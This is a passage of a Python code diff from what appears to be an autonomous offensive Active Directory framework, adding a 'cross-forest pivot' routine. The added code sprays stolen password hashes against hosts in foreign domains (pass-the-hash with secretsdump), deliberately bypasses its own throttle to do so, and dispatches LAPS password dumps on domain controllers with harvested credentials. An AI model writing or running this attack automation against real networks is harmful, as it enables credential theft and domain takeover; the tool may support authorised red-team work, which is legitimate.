+                    if not target_ips:
+                        continue
+
+                    logger.info(
+                        f"🌲 Auto-cross-forest-pivot: spraying hash "
+                        f"{hash_obj.username} from {hash_source_ip or hash_domain} "
+                        f"against {len(target_ips)} {foreign_domain} host(s)"
+                    )
+                    # Submit directly — bypass throttle for cross-forest critical path
+                    pth_payload: dict[str, Any] = {
+                        "domain": foreign_domain,
+                        "target_ips": target_ips,
+                        "dc_ip": dc_ip,
+                        "username": hash_obj.username,
+                        "hash_value": hash_obj.hash_value,
+                        "hash_type": hash_obj.hash_type,
+                        "reason": "cross_forest_pth",
+                        "techniques": ["secretsdump"],
+                    }
+                    if dispatcher._task_queue:
+                        pth_task_id = await dispatcher._task_queue.submit_task(
+                            task_type="credential_access",
+                            target_role="credential_access",
+                            payload=pth_payload,
+                            source_agent="auto_cross_forest_pivot",
+                            priority=2,
+                        )
+                        logger.info(
+                            f"🌲 Auto-cross-forest-pivot: PTH task {pth_task_id} "
+                            f"submitted directly (bypassed throttle)"
+                        )
+
+            # ── Phase C: FSP-Informed Attack Dispatch ──
+            # Dispatch LAPS dump attempts for any foreign domain where we have creds
+            for foreign_domain in undominated:
+                fd_lower = foreign_domain.lower()
+                dc_ip = state.domain_controllers.get(fd_lower)
+                if not dc_ip:
+                    continue
+
+                for cred in state.all_credentials:
+                    if not cred.domain or cred.domain.lower() != fd_lower or not cred.password:
+                        continue
+
+                    laps_key = f"laps:{fd_lower}:{dc_ip}:{cred.username.lower()}"
+                    if state.is_processed("processed_cross_forest_pivots", laps_key):
+                        continue
+
+                    state.mark_processed("processed_cross_forest_pivots", laps_key)
+
+                    logger.info(
+                        f"🌲 Auto-cross-forest-pivot: dispatching LAPS dump on "
+                        f"{foreign_domain} with {cred.username}@{cred.domain}"
+                    )
+
+                    await dispatcher._throttled_submit_task(
+                        task_type="recon",
+                        target_role="recon",
+                        payload={
+                            "tool": "laps_dump",
+                            "domain": foreign_domain,
+                            "target_ips": [dc_ip],
+                            "target": dc_ip,
+                            "username": cred.username,
+                            "password": cred.password,
+                        },
+                        source_agent="auto_cross_forest_pivot",
+                        priority=2,
+                    )
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Auto cross-forest pivot error: {e}", exc_info=True)
             await asyncio.sleep(check_interval)
 
 
